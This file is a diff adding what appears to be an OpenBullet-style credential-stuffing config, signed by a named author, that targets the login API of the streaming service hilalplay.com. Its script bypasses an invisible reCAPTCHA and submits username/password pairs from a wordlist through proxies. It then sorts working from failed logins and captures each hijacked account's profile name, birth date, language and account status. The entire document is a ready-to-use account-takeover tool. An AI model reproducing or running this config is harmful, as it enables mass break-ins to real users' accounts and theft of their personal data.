@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "hilal play",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-01-06T10:16:06.6228526+00:00",
+  "AdditionalInfo": "",
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CONECT REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LdVWe8ZAAAAAOzWSD0kbt2zUAdnt0-lzvbxZmUY&co=aHR0cHM6Ly9oaWxhbHBsYXkuY29tOjQ0Mw..&hl=en&type=image&v=-FJgYf1d3dZ_QPcZP7bd85hc&theme=light&size=invisible&badge=bottomright&cb=brn1oo6cchnd" 
+  
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" LR "type=\"hidden\" id=\"recaptcha-token\" value=\"" "\"" -> VAR "TK" 
+
+#POST REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LdVWe8ZAAAAAOzWSD0kbt2zUAdnt0-lzvbxZmUY" 
+  CONTENT "v=-FJgYf1d3dZ_QPcZP7bd85hc&reason=q&c=<TK>&k=6LdVWe8ZAAAAAOzWSD0kbt2zUAdnt0-lzvbxZmUY&co=&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: fa,en;q=0.9,en-GB;q=0.8,en-US;q=0.7" 
+  HEADER "content-length: 5628" 
+  HEADER "origin: https://www.google.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+
+#TR PARSE "<SOURCE>" LR "[\"rresp\",\"" "\"" -> VAR "TR" 
+
+#GET REQUEST GET "https://hilalplay.com/en/activate" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#POST_1 REQUEST POST "https://auth.hilalplay.com/v2/login?=&returnNewUserModel=true" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"gRecaptchaResponse\":\"<TR>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: auth.hilalplay.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://hilalplay.com/" 
+  HEADER "platform: web" 
+  HEADER "x-platform: web" 
+  HEADER "x-lang: en" 
+  HEADER "x-app-version: 2.1.3" 
+  HEADER "deviceUniqueId: 237b8394-9143-4de8-8821-7cfa1852df2a" 
+  HEADER "x-device-id: 237b8394-9143-4de8-8821-7cfa1852df2a" 
+  HEADER "Origin: https://hilalplay.com" 
+  HEADER "Content-Length: 517" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "TE: trailers" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password" 
+  KEYCHAIN Success OR 
+    KEY "\"Successful Response\",\"" 
+    KEY ",\"userId\":" 
+    KEY "Successful" 
+
+#Name PARSE "<SOURCE>" LR ",\"profileName\":\"" "\"," CreateEmpty=FALSE -> CAP "Name" "|" "|" 
+
+#birthday PARSE "<SOURCE>" LR ",\"birthDate\":" ",\"" CreateEmpty=FALSE -> CAP "Birthday" "|" "|" 
+
+#language PARSE "<SOURCE>" LR "\"langCode\":\"" "\"," CreateEmpty=FALSE -> CAP "Language" "|" "|" 
+
+#Status PARSE "<SOURCE>" LR "\"status\":\"" "\"" CreateEmpty=FALSE -> CAP "Status" "|" "|" 
+
+FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config by" 
+
